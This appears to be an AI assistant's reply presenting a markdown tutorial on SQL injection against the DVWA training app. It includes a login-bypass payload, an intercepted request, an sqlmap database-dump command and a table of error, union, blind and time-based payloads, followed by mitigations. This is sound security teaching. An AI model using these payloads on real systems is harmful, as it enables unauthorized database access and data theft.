I’ve created the full SQL Injection markdown content as a ready-to-use `.md` file for you.

I’ll save it as **`SQL_Injection.md`** so you can download and directly upload it to your GitHub repo.

# 💉 SQL Injection (SQLi) — Full Practical Guide

Welcome! This document covers the essentials of **SQL Injection (SQLi)** with practical steps using **Burp Suite**, **SQLmap**, and **DVWA**.

---

## 🔍 What is SQL Injection?

SQL Injection allows attackers to manipulate backend database queries by injecting malicious input.

- ⚠️ Caused by unsanitized user input
- 🎯 Targets login forms, URL parameters, search fields
- 🚨 Risks include data theft, unauthorized access, and system compromise

## 🛠️ Tools & Environment

| Tool       | Purpose                   |
|------------|---------------------------|
| DVWA       | Vulnerable web app for labs |
| Burp Suite | Manual request interception |
| SQLmap     | Automated SQLi exploitation |
| Kali Linux | Penetration testing OS      |

## 🔑 Manual SQL Injection with Burp Suite

1. Open DVWA, set security to **Low**.
2. Intercept the login request with Burp Suite.
3. Use this payload in username field to bypass login:

```sql
admin' OR '1'='1 --
````

4. Burp will show the intercepted request like:

```
POST /dvwa/login.php HTTP/1.1
Host: localhost
...
username=admin%27+OR+%271%27%3D%271+--+&password=anything&Login=Login
```

## 🤖 Automated SQL Injection using SQLmap

Run this command to find and dump databases:

```bash
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=123456" \
--dbs --batch
```

## 🔬 Types of SQL Injection

| Type             | Description                         | Example Payload                     |
| ---------------- | ----------------------------------- | ----------------------------------- |
| Error-based      | Leverages DB error messages         | `' OR 1=1 --`                       |
| Union-based      | Combines results from another query | `' UNION SELECT null, version() --` |
| Blind (Boolean)  | Infers data via true/false logic    | `' AND 1=1 --` vs `' AND 1=2 --`    |
| Time-based Blind | Uses time delays to infer data      | `' OR SLEEP(5) --`                  |

## 🧠 Key Learnings

* Manual and automated testing approaches
* Payload crafting for different SQLi types
* Importance of input validation and prepared statements

---

## 🛡️ Mitigation Recommendations

* Use parameterized queries / prepared statements
* Sanitize and validate all inputs
* Employ Web Application Firewalls (WAFs)
* Restrict DB user privileges

**How to use:**  
1. Download and upload this file into your repo inside a folder like `/SQLi/`  
2. Add your screenshots in `/SQLi/images/` folder with the names `login_bypass.png` and `sqlmap_results.png`  
3. Replace `YOUR_USERNAME` in GitHub and LinkedIn URLs with your actual usernames

If you want me to create that folder + image placeholders as well, just ask!
